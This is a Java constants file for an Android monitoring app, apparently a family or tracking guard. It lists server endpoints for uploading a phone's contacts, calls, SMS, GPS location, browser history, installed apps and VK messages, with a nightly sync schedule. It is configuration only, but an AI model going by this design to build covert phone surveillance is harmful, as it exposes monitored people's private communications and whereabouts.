package com.frostweepgames.familyguard.Settings;

/**-------------------------------
 * Created by Artem Shyriaiev on 15.09.2018
 * Powered by Frostweep Games
 * All rights reserved!
 * (c)2013-2018
 * www.frostweepgames.com
 ---------------------------------*/

public class Constants {

    public static final String APP_BUNDLE_IDENTIFIER = "com.frostweepgames.trackingguard";

    public static final String KEY_EXTRA = "extra";

    public static final String DEFAULT_CHARSET = "UTF-8";

    public static final String KEY_LOG_APP_ERROR = "EXCEPTION";

    public static final String APP_CHANNEL_NAME = "Tracking Guard";

    public static final int SYNC_AT_NIGHT_TIME_HOUR = 3;
    public static final int SYNC_AT_NIGHT_TIME_MINUTE = 0;

    public static final long DAY_INTERVAL = 1000 * 60 * 60 * 24; // day in milliseconds

    public static final int DEFAULT_NOTIFICATION_ID = 101;
    public static final String DEFAULT_NOTIFICATION_CHANNEL_ID = "tracking_guard_channel_1";
    public static final String NOTIFICATION_CONTENT_TEXT = "Click to check tracking status";

    // API Network
    public static final String SERVER_URL = "{server-endpoint}";

    public static final String SERVER_HELP_CHECK = "/rest/help/check";
    public static final String SERVER_HELP_SETTINGS = "/rest/help/setting";
    public static final String SERVER_HELP_ALARM = "/rest/help/alarm";
    public static final String SERVER_HELP_SYSTEM = "/rest/help/system";
    public static final String SERVER_SYNC_CONTACTS = "/rest/sync/contacts";
    public static final String SERVER_SYNC_CALLS =  "/rest/sync/call";
    public static final String SERVER_SYNC_SMS =  "/rest/sync/sms";
    public static final String SERVER_SYNC_INSTALLED_APPS =  "/rest/sync/app";
    public static final String SERVER_SYNC_GPS =  "/rest/sync/gps";
    public static final String SERVER_SYNC_BROWSERS_HISTORY =  "/rest/sync/browser";
    public static final String SERVER_SYNC_VK_GROUPS =  "/rest/vk/groups";
    public static final String SERVER_SYNC_VK_DIALOGS =  "/rest/vk/dialogs";
    public static final String SERVER_SYNC_VK_FRIENDS =  "/rest/vk/users";
    public static final String SERVER_SYNC_VK_MESSAGES =  "/rest/vk/messages";
    public static final String SERVER_SYNC_VK_SYNC =  "/rest/vk/sync";
    public static final String SERVER_HANDLE_LOGS =  "/rest/help/handle";


    public static final String SERVER_KEY_TOKEN = "token";
    public static final String SERVER_KEY_DATA = "data";
    public static final String SERVER_KEY_EMAIL = "email";


    // ALARMS
    public static final String ACTION_ALARM_SYNC_AT_NIGHT = "night_sync";
    public static final int SYNC_AT_NIGHT_ALARM_REQUEST_CODE = 299;

    public static final String ACTION_ALARM_SYNC_GPS = "gps_sync";
    public static final int SYNC_GPS_ALARM_REQUEST_CODE = 300;

    public static final String ACTION_ALARM_SYNC_SYSTEM = "system_sync";
    public static final int SYNC_SYSTEM_ALARM_REQUEST_CODE = 301;

    public static final String ACTION_ALARM_GET_SYNC_SETTINGS = "get_sync_settings";
    public static final int GET_SYNC_SETTINGS_ALARM_REQUEST_CODE = 302;

}
